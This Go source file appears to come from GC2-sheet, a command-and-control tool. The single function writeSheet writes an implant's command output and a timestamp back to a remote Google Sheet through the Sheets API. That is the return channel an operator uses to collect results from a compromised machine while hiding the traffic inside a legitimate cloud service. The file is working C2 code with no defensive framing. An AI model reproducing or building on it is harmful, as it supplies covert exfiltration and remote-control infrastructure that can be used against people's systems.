package C2

import (
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/utils"
	"fmt"
	"strconv"

	"google.golang.org/api/sheets/v4"
)

func writeSheet(client *sheets.Service, spreadSheet *configuration.SpreadSheet, lastCommand *configuration.Commands) {

	sheetName := spreadSheet.CommandSheet.Name
	rangeOut := lastCommand.RangeOut
	rangeLog := lastCommand.RangeLog
	rangeId := strconv.Itoa(lastCommand.RangeId)
	// Example: Sheet1!A2

	range2 := fmt.Sprintf("%s!%s%s:%s%s", sheetName, rangeOut, rangeId, rangeLog, rangeId)

	outputCommand := lastCommand.Output
	var output [][]interface{}
	output = append(output, make([]interface{}, 2))

	output[0][0] = outputCommand
	output[0][1] = utils.GetCurrentDate()

	valueRange := &sheets.ValueRange{
		Range:  range2,
		Values: output,
	}

	valueInputOption := "RAW"

	_, err := client.Spreadsheets.Values.Update(spreadSheet.SpreadSheetId, range2, valueRange).ValueInputOption(valueInputOption).Do()

	if err != nil {
		utils.LogDebug("[-] Cannot write on remote sheet: " + err.Error())
	}

}
